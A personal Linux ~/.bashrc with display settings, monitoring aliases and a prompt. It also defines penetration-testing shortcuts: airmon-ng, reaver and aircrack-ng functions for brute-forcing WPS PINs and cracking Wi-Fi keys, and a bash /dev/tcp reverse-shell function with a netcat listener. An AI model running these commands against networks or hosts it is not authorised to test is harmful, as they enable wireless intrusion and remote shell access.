# ~/.bashrc

# settings
stty stop ''; stty start '';
#setxkbmap -option ctrl:nocaps
shopt -s autocd # allows cd without cd
shopt -s checkwinsize # check window size
HISTSIZE= HISTFILESIZE= # infinite history

# alias
alias ls="ls --color=auto"
alias ll="ls -la --color=auto"
alias df="df -Tha --total"
alias free="free -mt"
alias grep="grep --color=auto"
alias wm-class="xprop | grep WM_CLASS"
alias wm-size="xprop | grep REGION"
alias yayskip="yay -S --mflags --skipinteg"
alias spotify="/opt/spotify/spotify --force-device-scale-factor=2.5 %U"
alias cpu-stats="watch -n.5 'cat /proc/cpuinfo | grep \"^[c]pu MHz\" && echo ----- && sensors | grep Core && echo ----- && sensors | grep fan'"
alias cpu-speed="watch -n.5 'cat /proc/cpuinfo | grep \"^[c]pu MHz\"'"
alias cpu-temp="watch -n.5 'sensors | grep Core'"
alias cpu-fan="watch -n.5 'sensors | grep fan'" 

# logs
function log-search() { sudo grep -rsh $1 /var/log | sort; }

# connections
alias ssh-connections="sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'"
alias smb-connections="sudo smbstatus -S && sudo smbstatus -L"

# airmon
alias air-start="sudo airmon-ng start wlp5s0"
alias air-stop="sudo airmon-ng stop wlp5s0mon"
alias air-listen="sudo airodump-ng wlp5s0mon"
function air-wps-new() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -N "$3"; }
function air-wps-restore() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -s "$3"; } 
function air-record() { sudo airodump-ng -c "$1" -w ~/archive/pen/capture/data-cap wlp5s0mon; }
function air-decrypt() { sudo aircrack-ng -z "$1" -w "$2"; }

# shell
function shell-connect() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }
function shell-listen() { sudo nc -nvlp "$1"; }

# color
PS1='\[\033[01;34m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
